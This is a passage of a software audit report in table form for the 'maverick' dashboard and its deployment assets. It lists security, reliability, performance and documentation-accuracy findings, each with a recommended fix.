| W3-22 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-dashboard/maverick_dashboard/api_schemas.py:344` | No global request-body cap and unbounded JSON fields (FactIn, AnswerIn, OutcomeIn.kind, ScheduleIn/TriggerIn params, FlowSaveIn.flow ...) — a 30 MB fact is accepted and echoed back by GET /api/v1/facts | Add one outermost middleware enforcing a default Content-Length/stream cap (e.g. 1-4 MB) for POST/PUT/PATCH outside the explicit large-body allowlist; add Field(max_length=...) to FactIn (key<=256, value<=64k), AnswerIn.answer, OutcomeIn.kind, param dict values, etc.; paginate or cap GET /api/v1/facts and require the 'view' permission explicitly. | S |

### dashboard/app (security headers) (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-18 | medium | Raised (finder cited evidence; skeptic pass not run); prior | security | `packages/maverick-dashboard/maverick_dashboard/app.py:1172` | CSP still allows 'unsafe-inline' scripts on every dashboard page (nonce migration open) | Generate a per-request nonce in security_headers, expose it to Jinja (request.state.csp_nonce), add nonce= to the inline <script>/<style> tags in templates, and drop 'unsafe-inline' from script-src first (style-src can follow). | L |
| W2-20 | low | Raised (finder cited evidence; skeptic pass not run) | supply-chain | `packages/maverick-dashboard/maverick_dashboard/app.py:1160` | /docs and /redoc load Swagger/ReDoc scripts from cdn.jsdelivr.net without SRI on an auth-exempt page | Serve swagger-ui/redoc assets from /static (FastAPI supports swagger_js_url/swagger_css_url) or add SRI hashes and drop cdn.jsdelivr.net from _DOCS_CSP; or gate /docs behind auth (see OpenAPI finding). | S |

### dashboard/app chat uploads (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-23 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-dashboard/maverick_dashboard/app.py:7670` | /chat/send reads every uploaded file fully into memory before the size check (up to N x 100 MB per request) | Mirror upload_attachment: `data = await f.read(MAX_FILE_BYTES + 1)` and raise 400 when len(data) > MAX_FILE_BYTES before calling store(); also enforce the per-goal total (existing_total) before reading the next part. | S |

### dashboard/app deliverables (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-21 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-dashboard/maverick_dashboard/app.py:2887` | /deliverables issues one SQL query per specialist pack (2,031 queries per page load) against an unindexed goals.domain column — 3 s per render at 20k goals | Replace the loop with one query using a window function (`SELECT * FROM (SELECT g.*, ROW_NUMBER() OVER (PARTITION BY domain ORDER BY id DESC) rn FROM goals g WHERE domain IN (...) [AND owner=?]) WHERE rn <= 5`) or at minimum restrict to domains that have goals (`SELECT DISTINCT domain FROM goals`), add a `goals(domain, id)` index via a governed migration (`python -m maverick.migration_governance --regen`), and run the read in run_in_threadpool. | M |

### dashboard/app page handlers (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-24 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-dashboard/maverick_dashboard/app.py:2624` | Sync SQLite work runs directly on the event loop in most async page handlers (overview, goals, spend, billing, deliverables, compartments...) while only the SSE loops offload | Convert the page controllers to either `def` (Starlette runs sync endpoints in the threadpool) or wrap the data-gathering in `await run_in_threadpool(...)`; add a lint/test that flags `async def` routes in app.py calling `_world()` outside run_in_threadpool. | M |

### dashboard/app projects (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-20 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-dashboard/maverick_dashboard/app.py:2807` | POST /chat/goal/{id}/project 500s on a non-numeric project_id and files goals under nonexistent or foreign projects | Parse with try/except -> 400, then `project = w.get_project(pid)`; 404 when missing, and apply the same owner rule project_detail uses (`project['owner'] in ('', owner)`), before calling set_goal_project. Add tests for 'abc', missing id and cross-owner id. | S |
| W3-25 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-dashboard/maverick_dashboard/app.py:2787` | /projects/{id} lists member goals without owner scoping or a limit | Pass `owner=goal_owner_filter(request)` and a `limit` (e.g. 200 with pagination) to list_goals in project_detail, and compute project_status_counts with the same owner filter. | S |

### dashboard/auth (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-77 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-dashboard/maverick_dashboard/auth.py:399` | Dashboard silently drops per-user tenancy when an env/client tenant floor is set, while the channel server still isolates per user | Either nest per-user tenants under the floor (`<floor>/api:<principal>` -- the path encoder already supports it) on both surfaces, or refuse to start / log an ERROR in doctor and config-lint when by_user is enabled together with a tenant floor. | S |

### dashboard/auth (SAML) (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-15 | medium | Raised (finder cited evidence; skeptic pass not run); prior | security | `packages/maverick-dashboard/maverick_dashboard/saml.py:171` | SAML config allows want_assertions_signed=false while want_response_signed is hard-coded False, so a misconfiguration accepts unsigned assertions | Refuse to enable SAML when want_assertions_signed is false unless want_response_signed is true (expose the latter as a knob), log/assert at startup, and add a wizard/docs warning. Alternatively drop the knob entirely and always require signed assertions. | S |
| W2-17 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-dashboard/maverick_dashboard/saml.py:544` | SAML ACS/login rebuild the pysaml2 client (remote IdP metadata fetch) per request and run verification synchronously in the async handler | Build and cache the Saml2Client once per config (refresh on a timer), and run prepare_login_redirect/verify_acs_response via run_in_threadpool. | S |

### dashboard/auth (SCIM lifecycle + RBAC) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-13 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-dashboard/maverick_dashboard/scim_groups.py:435` | Every authenticated request re-parses the SCIM roster, subject directory, RBAC rosters and revocation store from disk with no caching (O(n) over up to 100k SCIM users) | Add an mtime-keyed in-process cache (with the existing cross-process lock discipline for writes) in scim._load, subject_directory._load, rbac._load/_load_custom/_load_tenant and session_revocation._load; index SCIM users by externalId/id once per load so _matching_users is a dict lookup; memoize role/suite resolution on request.state for the lifetime of one request. | M |

### dashboard/auth (credential probing) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-14 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-dashboard/maverick_dashboard/app.py:1962` | No throttling or lockout on authentication failures: static dashboard bearer, SCIM bearer, invite and share tokens can be brute-forced at line rate | Reuse the existing sliding-window limiter (check_goal_rate_limit / external_gateway._rate_limit) keyed by client IP + path family for 401/403 outcomes in bearer_auth, scim._authorize and the token-addressed public routes (e.g. 20 failures/min then 429 with Retry-After); enforce a minimum length for MAVERICK_DASHBOARD_TOKEN / MAVERICK_SCIM_TOKEN at startup (refuse < 24 chars with a clear error). | M |

### dashboard/auth (exemption lists) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-10 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-dashboard/maverick_dashboard/app.py:1350` | /consent/webhook is exempt from the bearer middleware but not from the global auth dependency, so every CMP delivery 401s on any authenticated deployment | Add "/consent/webhook" to auth._SELF_AUTH_EXEMPT_PATHS (or derive one shared set: have app._AUTH_EXEMPT import from auth so the two lists cannot drift) and add a test that posts to /consent/webhook with MAVERICK_DASHBOARD_TOKEN set and expects the route's own 401/403 HMAC outcome, not the dependency's. | S |

### dashboard/auth (invites) (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-16 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-dashboard/maverick_dashboard/invite_routes.py:152` | SSO-mode invite acceptance binds whichever principal is signed in, never checking the invited email | In SSO mode require a match between inv.email and the session identity (compare against the email/preferred_username/upn claims recorded by subject_directory at login, or store the OIDC claims on the session), or at minimum allow an admin to opt in to strict email binding and log a warning when the accepting principal differs from the invitee. | S |
| W2-24 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-dashboard/maverick_dashboard/invites.py:40` | Invite-minted local sessions last 30 days with no idle timeout, rotation, or step-up for admin actions | Default invite sessions to hours (configurable), add an idle timeout via a refreshed exp on activity, and require a fresh invite (or OIDC) for admin-permission mutations after N hours. | S |

### dashboard/automation_queue + core/automation_events (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-74 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/automation_events.py:611` | Automation tick holds a blocking, untimed flock while polling sources; IMAP source has no socket timeout, so one hung mailbox wedges every automation thread silently | Pass timeout= (e.g. 30s) to imaplib.IMAP4/IMAP4_SSL and wrap login/select/fetch in the same bound; give _poll_guard a bounded acquisition (try LOCK_NB with a short retry budget, and skip the tick with a warning when the lock is held past N seconds); consider a per-tick watchdog that stops heartbeating when a poll exceeds a hard ceiling so reclaim can recover. | S |

### dashboard/automation_queue + core/postgres (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-78 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-dashboard/maverick_dashboard/automation_queue.py:252` | Unbound base-namespace maintenance pass writes NULL-tenant rows that every tenant can read in the default (non-strict) Postgres mode | Skip the unbound base pass when a roster exists and no floor is configured (only iterate provisioned tenants), and have doctor/config-lint warn when list_tenants() is non-empty on Postgres but strict_tenant_isolation is off. Consider defaulting strict mode on whenever tenant_registry.json exists. | S |

### dashboard/automation_queue + core/runner (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-73 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/runner.py:164` | Automation worker pool (3 threads) can be fully blocked for 300s per job by runner semaphore waits, and no-slot attempts are counted toward dead-lettering | For queue-driven runs, use a short/non-blocking acquire (timeout=0 or a few seconds) and on 'no slot' re-schedule the job via fail(retry_after=..., but without consuming an attempt — e.g. add JobQueue.defer() that resets run_at without bumping attempts, as automation_queue._defer_for_slot already does for flows). Reserve at least one automation thread for control jobs (tick/sweep) or run goals on a separate pool. | M |

### dashboard/i18n (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-73 | medium | Raised (finder cited evidence; skeptic pass not run); prior | ux | `packages/maverick-dashboard/maverick_dashboard/templates/base.html:2` | html lang is set to the selected UI language but the page content stays ~100% English (WCAG 3.1.1 mismatch); most catalog keys are never used | Short term: set html lang to 'en' unless the resolved language actually covers the page (or expose lang only on the translated chrome elements via lang= on those spans) so assistive tech is not lied to; keep dir from the selection. Medium term: route nav group labels and hero literals through t(), or drop the unused catalog keys and the fr/de/ja/zh options from the language selector until they render something. | M |

### dashboard/saml (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-75 | medium | Raised (finder cited evidence; skeptic pass not run); prior | testing | `packages/maverick-dashboard/tests/test_saml.py:3` | SAML ACS assertion handling is only tested against a fake `saml2` module; pysaml2 is never installed in any CI job | Install `[saml]` in the test job and add a test that builds a real signed Response with pysaml2's test utilities (self-signed cert in tmp_path) and drives /saml/acs end-to-end, including a tampered-signature and a replayed-ID case; keep the hermetic tests for the config layer. | M |

### dashboard/suite-apis (error contract) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-4 | medium | Raised (finder cited evidence; skeptic pass not run) | dx | `packages/maverick-dashboard/maverick_dashboard/cortex_api.py:112` | _call error translators map the same exception classes to different HTTP statuses across suites (ValueError -> 409 vs 422; ConfigError -> 403 vs 503; detail redaction varies) | Define one error taxonomy in _shared.py (NotFound->404, Conflict/Stale/Idempotency->409, Validation/ValueError->422, PermissionDenied->403, Disabled/Config->403 or 503 — pick one, document it), expose translate_domain_errors(module_exceptions) and have each _call use it. Add response_model/responses declarations so /openapi.json advertises the statuses. | M |

### dashboard/suite-apis (module coupling) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-7 | medium | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-dashboard/maverick_dashboard/governance_api.py:18` | governance_api.py builds its 45 routes on private helpers imported from model_risk_api.py; 7 schedulers import the private _run_for_active_tenants from automation_queue | Promote _actor/_call/_module/_record_call/_human_principal into _shared.py (or an assurance_common.py) with public names, and rename _run_for_active_tenants to a public run_for_active_tenants in automation_queue (keep the alias). Consider splitting model_risk_api.py by sub-prefix (model-risk, ai-incidents, evidence gateway, ...) using APIRouter.include_router. | M |

### dashboard/suite-apis (module size) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-14 | medium | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-dashboard/maverick_dashboard/model_risk_api.py:34` | Suite route modules are oversized hotspots: model_risk_api (5,545 lines / 238 routes), consent_public_api (4,831), security_api (2,940 / 75 routes), ai_evidence_analysis_composition (2,717), identity_governance_scheduler (1,711) | Split model_risk_api.py by URL sub-prefix into 4-6 routers included from one package module; move the gateway limiter into its own module; split identity_governance_scheduler.py into engine composition vs polling loop; cap new suite modules at ~1,000 lines via a CI size gate. | L |

### dashboard/suite-apis (public rate limiting) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-6 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-dashboard/maverick_dashboard/policy_publication_links_api.py:962` | Public-endpoint rate limiters key on request.client.host, so behind the documented reverse proxy every consumer shares one bucket (single-client DoS of policy links / native consent SDK / receipt keys) | Add a trusted-proxy-aware client_ip(request) helper next to proxy_auth's trusted_proxies (honour X-Forwarded-For/Forwarded only from pinned proxies, else request.client.host) and use it in all four limiter sites; consider keying public-link limits by (link_id, credential/capability) in addition to IP, and document the shared-bucket behaviour when no trusted proxy is configured. | M |

### dashboard/suite-apis (shared helpers) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-3 | medium | Raised (finder cited evidence; skeptic pass not run) | duplication | `packages/maverick-dashboard/maverick_dashboard/consent_scan_inventory_api.py:182` | Boilerplate helpers duplicated across the suite layer instead of living in _shared.py (_StrictModel x61, _tenant_id x48, _jsonable x30, _call x26, _sha256/_digest x29, CSP-nonce page boilerplate x19) | Grow _shared.py (or a new suite_common.py) with: StrictModel base, require_tenant(detail_suffix) -> str, jsonable(), canonical_sha256(), a translate_errors(mapping) factory for _call, and a private_page_response(templates, request, template, ctx) helper that applies the standard security headers + nonce. Migrate modules incrementally; add a ruff/AST CI check that fails on a new `def _tenant_id(`/`class _StrictModel(` in the suite layer. | M |

### dashboard/suite-apis (test coverage) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-10 | medium | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-dashboard/maverick_dashboard/trust_center_branding_api.py:84` | Untested suite modules: consent_delivery_destinations_api, trust_center_branding_api (14 mutating admin routes), trust_center_branding_composition, tenant_select_page | Add tests/test_trust_center_branding_api.py (guard checks per route, 404/409/422 translation, expire_domains bound), tests/test_consent_delivery_destinations_api.py, and a tests/test_tenant_select_page.py covering membership filtering, is_admin, and _safe_return_path (backslash, //, control chars). | M |

### dashboard/templates (3)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-72 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-dashboard/maverick_dashboard/templates/_hero.html:33` | hero()/state() macros mark title/lede/copy \|safe, and callers concatenate runtime values into them — autoescape is bypassed for anything passed there | Remove \|safe from the macro slots. Where callers need inline markup (<strong>, <code>), either (a) build the value with Markup in the caller: {{ state(..., copy=('Sandbox: <code>%s</code>' \| safe) \| format(perm.sandbox.backend \| e)) }} is awkward, so better (b) give the macros explicit escaped slots (e.g. state(label, name, copy_prefix, copy_value, copy_suffix) or a nested {% call %} body) so raw values are always escaped by autoescape, and keep \|safe only for literal template strings. Add a test that renders users.html with default_role='<s>x</s>' and asserts the tag is escaped. | S |
| W3-81 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-dashboard/maverick_dashboard/templates/_governance_operations.html:1` | ~19,000+ lines of page logic live in inline <script> blocks inside templates (one partial alone has a 1,952-line script), outside the node test suite and the nonce plan | Adopt the pattern already used by the newer modules (static/lightwork-<module>.js + a tests/js/<module>.test.js): extract the largest inline scripts first (_governance_operations, privacy, workflow_builder, chat_goal), pass page data via data-* attributes or a single {{ ... \| tojson }} config block, and add a lint that fails when a template's inline script exceeds N lines. Add tests for the two untested static modules. | L |
| W3-82 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-dashboard/maverick_dashboard/templates/privacy.html:1386` | Some innerHTML string builders interpolate server fields without esc(); safe today only because the fields happen to be numeric/ids | Wrap every interpolated field in esc() regardless of expected type (esc(String(x)) is cheap), or switch these builders to DOM APIs (createElement/textContent) as security_threats.html and chat_goal.html's history renderer already do. Consider an eslint rule in tests/js forbidding string concatenation into innerHTML without esc. | S |

### demo apps (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-59 | medium | Raised (finder cited evidence; skeptic pass not run) | testing | `pyproject.toml:100` | demo/ ships 17 test files (168 tests) that no pytest invocation or CI job ever collects | Add "demo" to testpaths (or a dedicated `demo` CI job) and mark demo tests that need the platform with a marker; fix the subprocess env inheritance per finding 1 so they pass. | S |

### dependencies/automation (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-9 | medium | Raised (finder cited evidence; skeptic pass not run) | supply-chain | `.github/dependabot.yml:58` | Dependabot covers only four ecosystems/directories; Go, Docker, Terraform, NuGet, Maven, Swift and most Cargo/npm trees are unmonitored | Add `gomod` (/go/model-proxy, /examples/clients/go), `docker` (/deploy/docker, /demo/*), `terraform` (/deploy/aws/terraform), `nuget`, `maven`, `swift`, additional `cargo` directories (apps/desktop/src-tauri, apps/installer-desktop/src-tauri, apps/desktop-runtime, examples/clients/rust) and additional `npm` directories, grouped weekly like the existing entries. | S |

### deploy/ci (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-41 | medium | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/tests/test_release_packaging.py:622` | No CI gate validates Helm/Terraform/compose assets — only version strings are asserted | Add a `deploy-assets` workflow job: `helm lint` + `helm template` (default and with ingress/networkPolicy/serviceMonitor enabled) piped to kubeconform, `terraform fmt -check` + `terraform init -backend=false` + `terraform validate` (+ tflint/checkov), `docker compose -f ... config` for the three compose files, and hadolint on the Dockerfiles. | S |

### deploy/helm (3)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-30 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `deploy/helm/maverick/values.yaml:153` | Helm chart advertises ingress.* values but ships no Ingress template — ingress.enabled=true is a silent no-op | Add templates/ingress.yaml (networking.k8s.io/v1, using .Values.ingress.className/annotations/hosts/tls) or delete the ingress block from values.yaml and the README mention. Add a `helm template --set ingress.enabled=true \| grep 'kind: Ingress'` assertion to the packaging tests. | S |
| W5-53 | low | Raised (finder cited evidence; skeptic pass not run) | security | `deploy/helm/maverick/templates/deployment.yaml:26` | Helm chart mounts the default ServiceAccount token into the dashboard pod (no dedicated SA, automountServiceAccountToken unset) | Add `automountServiceAccountToken: false` to the pod spec (and a `serviceAccount.create` value with its own SA also set to false) — the dashboard makes no Kubernetes API calls. | S |
| W5-42 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `deploy/helm/maverick/templates/deployment.yaml:70` | Helm: secret.create=false without secret.name yields a hard secretRef to a nonexistent '<release>-secrets' (CreateContainerConfigError) | In maverick.validate add `{{- if and (not .Values.secret.create) (not .Values.secret.name) }}{{ fail "secret.name is required when secret.create=false" }}{{ end }}`. | S |

### deploy/observability (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-36 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `deploy/observability/prometheus-rules.yaml:81` | Prometheus alert rules apply increase() to gauges (maverick_queue_jobs, maverick_goals_total) — dead-letter and failure-rate alerts fire on noise or miss real events | Either expose true counters (maverick_goal_transitions_total{status}, maverick_queue_job_failures_total) from health_routes.py and alert on those, or rewrite the rules with gauge-safe expressions (e.g. `delta()`/`max_over_time - min_over_time` or `maverick_queue_jobs{status="failed"} > 0`), rename maverick_goals_total to maverick_goals (Prometheus naming convention), and update grafana-dashboard.json panel 3. | S |

### deploy/vps (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-40 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `deploy/vps/maverick.service:19` | VPS systemd unit hardcodes ~/maverick-workspace and a mandatory EnvironmentFile — the service fails to start if the wizard chose another workdir or wrote no .env | Render WorkingDirectory/ReadWritePaths from the wizard's chosen sandbox.workdir in install_service() (read config.toml with python -c), use `EnvironmentFile=-/home/%i/.maverick/.env`, and add a `systemd-analyze verify` + `systemctl start` smoke check at the end of install.sh. | S |
| W5-48 | low | Raised (finder cited evidence; skeptic pass not run) | dx | `deploy/vps/install.sh:134` | VPS install omits the postgres/oidc/s3 extras that the container image installs, so MAVERICK_WORLD_BACKEND=postgres or OIDC login fails on a VPS | Add `MAVERICK_CORE_EXTRAS` (default `release-runtime,postgres,oidc,s3` for VPS) to install.sh and pass it through; mention the extras in deploy/postgres/README.md 'Install the extra' section for pipx installs. | S |

### docker/base-image (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-11 | medium | Raised (finder cited evidence; skeptic pass not run) | supply-chain | `deploy/docker/Dockerfile:19` | Container base-image digest is a 5-week-old build-arg duplicated in three places with no refresh automation; Dockerfile default floats | Move the digest into the Dockerfile (`FROM python:3.12-slim@sha256:... AS wheel-builder`), drop the build-arg indirection, enable Dependabot `docker` for /deploy/docker and /demo, and reference the same digest in agent-on-pr.yml via a single source (e.g. a `deploy/docker/base-image.txt` read by both workflows with a test asserting equality). | S |

### docs/FEATURES + reachability (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-4 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/FEATURES.md:3022` | FEATURES.md cites consent_standards.py and consent_ergonomics.py as shipped capability; both are TEST_ONLY (nothing in production imports them) | Either wire consent_standards.detect_privacy_headers into consent_public_api's GPC/DNT capture (and consent_ergonomics into tools/consent_ergonomics), or move both entries in FEATURES.md to a 'library/roadmap' section. Add the promised doc check (see reachability finding). | S |

### docs/FEATURES vs ai_benchmark_coordinator (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-34 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/FEATURES.md:1369` | FEATURES.md presents the benchmark coordinator as shipped capability although nothing in production or the CLI imports it (live class TEST_ONLY) | Either wire the coordinator behind an explicit opt-in (config knob + wizard step + dashboard/CLI entry) or move the paragraph describing it to a roadmap/experimental section and mark the module experimental. Re-run the reachability ledger after the change. | S |

### docs/api (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-109 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/api.md:182` | docs/api.md is stale on two load-bearing facts: SSE 'may be added in v0.2' (it exists) and default caps '$2, 30min' (code: $5, 3600s) | Fix the defaults sentence to '$5, 1h' (or lower the code defaults to match the documented conservative posture) and document the SSE stream endpoint (plus `MAVERICK_DASHBOARD_MAX_SSE`) in the Goals table. | S |

### docs/architecture (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-100 | medium | Raised (finder cited evidence; skeptic pass not run); prior | docs-accuracy | `docs/architecture.md:34` | Schema version stale in three architecture docs: 'v23' vs actual SQLite head v33 | Replace the literal with the live value (or a sentence like 'schema head: see `maverick version`') in README.md:179, ARCHITECTURE.md:43, docs/architecture.md:34; add a small doc-lint test that greps these three files for `schema v(\d+)` and asserts it equals `max(world_model.MIGRATIONS)`. | S |

### docs/cli-reference (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-51 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/self-learning.md:272` | Two documented commands do not exist: `maverick approve` and `maverick replay` | Replace `maverick approve` with the actual path (dashboard approvals queue / `maverick refine apply --approval-id`), and `maverick replay` with `maverick diag replay`; add the scratch docs-vs-click-tree diff as a CI check (docs mention -> command exists). | S |
| W3-70 | improvement | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/handbook.md:174` | 89 of 175 top-level commands are absent from the four primary docs and 17 are not mentioned anywhere under docs/; there is no generated CLI reference | Generate docs/cli.md from the click tree (the audit walker already emits name/help/params JSON) in a `make docs` step, and add a CI check that every `maverick <cmd>` token in docs/ resolves to a real command. | M |

### docs/community (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-105 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/showcase.md:33` | Public showcase page tells submitters to run `maverick replay`, which is not a top-level command (it is `maverick diag replay`) | showcase.md:33 -> `maverick diag replay`; self-learning.md:272 -> name the real surface (dashboard /approvals queue or the actual CLI verb) or remove the claim. | S |

### docs/deployment (3)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-115 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/deployment.md:3` | docs/deployment.md covers 9 of 17 channels and 4 of the deployment targets that exist under deploy/ (no Kubernetes/Helm, AWS Terraform, WhatsApp Cloud API) | Extend the channel matrix to all 17 adapters (mark macOS/Twilio requirements), add Kubernetes (Helm) and AWS (Terraform) sections or link deploy/aws/terraform and docs/reference-architectures.md, and change 'Four deployment targets' accordingly. | M |
| W5-37 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/deployment.md:43` | docs/deployment.md tells users to run ghcr.io/daybreak-ai-labs/lightwork:latest, but the release workflow never publishes a :latest tag | Change docs/deployment.md:43 to `ghcr.io/daybreak-ai-labs/lightwork:0.1.7` (or `@sha256:` digest) and reference deploy/verify-release.sh; alternatively publish a `latest` tag deliberately in release.yml if floating tags are wanted. | S |
| W5-38 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/deployment.md:57` | docs/deployment.md VPS section describes wizard behavior that does not exist (generated systemd unit, Caddy config, /etc/maverick/config.toml) | Rewrite docs/deployment.md lines 53-69 to describe install.sh's actual behavior (unit rendered from deploy/vps/maverick.service, config under $TARGET_HOME/.maverick, Caddyfile is a manual copy), and drop or implement the Caddy step in install.sh. | S |

### docs/external-agents (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-106 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/external-agents.md:75` | Documented endpoint `POST /api/v1/external-agents/{id}/revoke` is not registered (OpenAPI has release/reset-budget/credentials/DELETE only) | Either add the `POST /external-agents/{agent_id}/revoke` route (mirroring the CLI `revoke`/`restore` pair) to the external-agents router, or correct the doc to the real REST verb (`DELETE /api/v1/external-agents/{id}` if that is the intended revocation) and mention the CLI. | S |

### docs/index (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-107 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/index.md:27` | docs/index.md (public landing page) has a broken bullet: the channel list is split across two other bullets | Move lines 43 back under the Multi-channel bullet (and update the list to the 17 wired channels). | S |

### docs/learning (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-108 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/index.md:50` | factory-learn default contradicts across README, docs/index.md and docs/architecture.md (code: default-on) | Correct docs/index.md:50 and docs/architecture.md:83-86 to 'on by default; disable with `[self_improvement] factory_learning = false`' (or whichever is the intended product decision) and keep README consistent. | S |

### docs/marketing (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-101 | medium | Raised (finder cited evidence; skeptic pass not run); prior | docs-accuracy | `docs/index.md:6` | Suite count contradicts code and itself: '53 business suites' (README/index/press-kit/FEATURES) vs 54 in code and comparison.md | Update README.md:22, docs/index.md:6, docs/press-kit.md:28, docs/FEATURES.md:1498 to 54 and derive the number in a test (`len(SUITE_PREFIXES)` vs grep of the docs) so the next suite addition can't drift. | S |
